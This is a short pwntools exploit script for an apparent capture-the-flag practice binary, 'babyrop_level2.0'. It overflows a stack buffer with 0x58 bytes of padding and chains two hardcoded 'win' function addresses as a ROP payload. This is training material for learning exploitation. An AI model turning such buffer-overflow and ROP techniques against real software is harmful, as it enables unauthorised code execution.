from pwn import *

binary = './babyrop_level2.0'

p = process(binary)

win1 = 0x0000000000402049
win2 = 0x00000000004020f6

#gdb.attach(p, '''
#b * challenge
#''')

offset = 0x50 + 8
payload = flat(
	b'A' * offset,
	p64(win1),
	p64(win2)
)
p.sendline(payload)
p.interactive()
